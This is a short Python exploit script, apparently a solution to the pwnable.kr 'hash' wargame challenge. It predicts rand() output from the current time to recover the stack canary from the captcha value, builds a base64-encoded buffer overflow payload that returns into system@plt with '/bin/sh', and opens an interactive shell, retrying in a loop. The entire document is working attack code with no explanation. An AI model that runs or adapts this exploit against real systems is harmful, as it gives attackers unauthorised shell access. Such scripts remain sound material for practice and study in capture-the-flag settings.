from zio import *
import os, base64, ctypes, time, urllib2, random

target  = './hash'
target  = ('pwnable.kr', 9002)

def exp(target):
    # leak info
    leak    = os.popen('./leak ' + str(int(time.time()) + random.randint(-10, 10))).read().split('*')[0:-1]
    leak    = [int(l) for l in leak]
    io      = zio(target, print_read = False, print_write = False)
    
    # calc canary
    io.read_until('input captcha : ')
    captcha = int(io.read_line()[0:-1])
    canary  = captcha - leak[1] - leak[2] + leak[3] - leak[4] - leak[5] + leak[6] - leak[7]
    print '[+] leak canary : ' + hex(ctypes.c_uint32(canary).value)
    
    io.writeline(str(captcha))
    io.read_until('Encode your data with BASE64 then paste me!')
    
    plt_system  = 0x8048880
    adr_gbuf    = 0x804b0e0
    
    payload  = 'A' * 0x200
    payload += l32(canary)
    payload += 'A' * 0xc
    payload += l32(plt_system)
    payload += l32(0xdeadbeef)
    payload += l32(adr_gbuf + 0x2d1)
    
    io.writeline(base64.b64encode(payload) + 'A/bin/sh')
    io.interact()

while True:
    exp(target)
